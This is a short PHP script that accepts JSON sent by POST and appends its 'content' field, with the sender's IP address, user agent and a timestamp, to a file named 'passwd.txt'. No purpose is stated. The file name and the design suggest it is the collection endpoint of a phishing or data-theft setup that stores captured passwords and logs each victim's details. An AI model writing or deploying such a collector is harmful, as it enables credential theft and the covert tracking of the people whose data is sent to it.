<?php
date_default_timezone_set("UTC"); // Set the default timezone to UTC

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the JSON data from the request body
    $json_data = file_get_contents("php://input");

    if ($json_data === false) {
        echo "Error reading JSON data from the request.";
    } else {
        // Decode the JSON data into an associative array
        $data = json_decode($json_data, true);

        if ($data === null) {
            echo "Error decoding JSON data.";
        } else {
            // Sanitize the data (if necessary) before saving it
            $content = htmlspecialchars($data["content"]);

            // Get the user agent, IP address, and time
            $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "N/A";
            $ipAddress = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : "N/A";
            $timestamp = date("Y-m-d H:i:s");

            // Define the file path for storing data
            $filePath = "passwd.txt";

            // Prepare the content with user agent, IP address, and time
            $contentToSave = "Timestamp: " . $timestamp . "\nUser Agent: " . $userAgent . "\nIP Address: " . $ipAddress . "\n" . $content . "\n\n";

            // Append the content to the file
            if (file_put_contents($filePath, $contentToSave, FILE_APPEND | LOCK_EX) !== false) {
                echo "Data successfully saved.";
            } else {
                echo "Error occurred while saving data.";
            }
        }
    }
} else {
    echo "Invalid request method.";
}
?>

